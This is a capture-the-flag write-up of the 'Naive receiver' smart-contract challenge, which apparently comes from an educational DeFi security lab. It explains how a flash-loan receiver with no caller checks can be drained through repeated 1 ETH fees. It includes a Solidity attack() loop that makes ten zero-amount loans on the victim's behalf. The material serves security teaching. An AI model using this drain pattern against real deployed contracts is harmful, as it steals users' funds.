## Naive receiver

### Challenge description

> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
>
> You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
>
> Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

### Solution

The receiver contract will forward `amountToBeRepaid` to the pool, which includes the pool fee:

```solidity
uint256 amountToBeRepaid = msg.value + fee;
```

And the pool will always charge a fixed fee of 1 ETH in `flashLoan()`:

```solidity
require(
    address(this).balance >= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);
```

Given that the `receiveEther()` function does not check for a `msg.value` and that the contract doesn't check that `tx.origin` comes from the deployer of the receiver contract (whoever owns it), it is possible to drain its balance and send it to the pool in either 10 transactions with a `borrowAmount` of 0 wei or in one transaction in a short contract which performs a loop:

```solidity
function attack() public {
    for (uint8 i = 0; i < 10; i++) {
        naiveReceiverPool.flashLoan(address(naiveReceiver), 0);
    }
}
```
